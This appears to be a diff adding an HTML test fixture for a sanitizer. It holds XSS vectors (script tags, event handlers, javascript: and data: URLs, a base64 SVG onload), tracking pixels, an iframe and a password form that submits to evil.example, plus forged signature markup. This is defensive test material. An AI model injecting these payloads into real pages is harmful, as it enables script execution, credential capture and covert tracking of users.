@@ -1,0 +1,12 @@
+<p>Normal text <b onclick="alert(1)">bold</b></p>
+<script>alert('x')</script>
+<style>body{background:url(https://tracker.example/p.gif)}</style>
+<iframe src="https://evil.example/"></iframe>
+<p><a href="javascript:alert(2)">click me</a> and <a href="data:text/html,<script>alert(3)</script>">data link</a> and <a href="https://ok.example/">good link</a></p>
+<p><img src="https://tracker.example/pixel.gif" width="1" height="1"><img src="x" onerror="alert(4)"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoNSkiLz4="></p>
+<svg onload="alert(6)"><circle r="5"/></svg>
+<form action="https://evil.example/"><input name="password"><button>Go</button></form>
+<table><tr><td>cell one</td><td>cell two</td></tr></table>
+<p style="position:fixed;top:0;background-image:url(https://tracker.example/bg.gif);color:#d93025">styled</p>
+<div data-signature-id="sig-en">fake signature</div>
+<img src="blob:https://evil.example/123" data-content-id="forged@x">
